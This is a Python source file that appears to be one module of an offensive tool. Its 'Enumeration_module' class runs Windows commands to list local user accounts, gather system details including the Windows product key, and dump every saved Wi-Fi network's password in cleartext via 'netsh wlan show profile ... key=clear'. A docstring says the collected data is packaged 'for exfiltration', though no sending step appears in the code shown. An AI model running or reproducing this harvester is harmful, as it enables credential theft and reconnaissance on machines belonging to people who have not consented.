import subprocess

class Enumeration_module:

    def __init__(self):
        self.users =  []
        self.system_info = {}
        self.wifi_passwords = {}

    def get_users(self):
        try:
            # Run the 'net user' command to get the list of users
            result = subprocess.run(['net', 'user'], capture_output=True, text=True)
            
            #split the output into lines and extract user names
            lines = result.stdout.split('\n')
            lines = lines[4:-3]
            
            #the user names are listed starting from the 4th line, until the third to last line
            for line in lines:
                # Split by spaces and filter out empty strings
                self.users.extend([user for user in line.split() if user])

            print(self.users)
            
        except Exception as e:
            print(f"Error: {e}")

    
    def get_system_info(self):
        """
        A method which grabs basic Windows system information
        """

        commands = {'OS Version': 'systeminfo | find "OS Version"',
                    'System Manufacturer': 'systeminfo | find "System Manufacturer"',
                    'System Boot Time': 'systeminfo | find "System Boot Time"', 
                    'Total Physical Memory': 'systeminfo | find "Total Physical Memory"',
                    'Computer Name': 'echo %COMPUTERNAME%',
                    'CPU': 'wmic cpu get name /format:list',
                    'Total Physical Memory': 'systeminfo | find "Total Physical Memory"',
                    'Username': 'echo %USERNAME%',
                    'Registered Owner':  'systeminfo | find "Registered Owner"',
                    'Product ID': 'systeminfo | find "Product ID"',
                    'Windows product key':'wmic path softwarelicensingservice get OA3xOriginalProductKey',
                    'keyboard Layout': 'systeminfo | find "Input Locale"' 
                    }
        
        for key, command in commands.items():
            try:
                print(command)
                output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True).stdout.strip()
                # Clean up the output
                if ':' in output:
                    output = output.split(":", 1)[-1].strip()  # Extracting the value part after the first occurrence of ':'
                self.system_info[key] = output

            except:
                pass

    def get_wifis(self):
        """
        a method which exploits the windows netsh wlan show profile command to show all the know wifi ssids
        """
        try:
            #windows command is netsh wlan show profiles, this will display all the profiles 
            output = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8").split("\n")
            #clear the rest of the output and only show the SSIDs and add them to a list ssids
            #strip all the information before the ':' away for each line
            ssids = [line.split(":")[1].strip() for line in output if "All User Profile" in line]

            if not ssids:
                print("No Wi-Fi profiles found.")
                return

            print(ssids)
        
        except subprocess.CalledProcessError as e:
            print(f"Error fetching Wi-Fi profiles: {e}")
            return
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            return

        
        for ssid in ssids:
            try:

                print(f"fetching wifi password of {ssid}")
                #netsh wlan show profile <ssid> key=clear shows the password associated with it that is stored in memory might reuire root
                output = subprocess.check_output(["netsh", "wlan", "show", "profile", ssid, "key=clear"]).decode("utf-8").split("\n")
                password_lines = [line.strip() for line in output if "Key Content" in line]
                if password_lines:
                    password = password_lines[0].split(":")[1].strip()
                    self.wifi_passwords[ssid] = password
                    
                else:
                    print("couldnt get passwords, is the ssid list filled?")

                    
            except:
                print(f"couldnt get password for {ssid}")
                self.wifi_passwords[ssid] = ""

    def returns(self):
        """
        a method which puts all the found data into a dictionary for exfiltration
        """
        return {
            "users": self.users,
            "system_info": self.system_info,
            "wifi_passwords": self.wifi_passwords
        }



def automate():
    enum = Enumeration_module()
    enum.get_users()
    enum.get_system_info()
    enum.get_wifis()

    exfil_data = enum.returns()

    return exfil_data

if __name__ == "__main__":
    
    #enum = Enumeration_module()

    #enum.get_users()
    #enum.get_system_info()
    #enum.get_wifis()
    #print(enum.users)
    #print(enum.wifi_passwords)
    #print(enum.system_info)

    print(automate())
    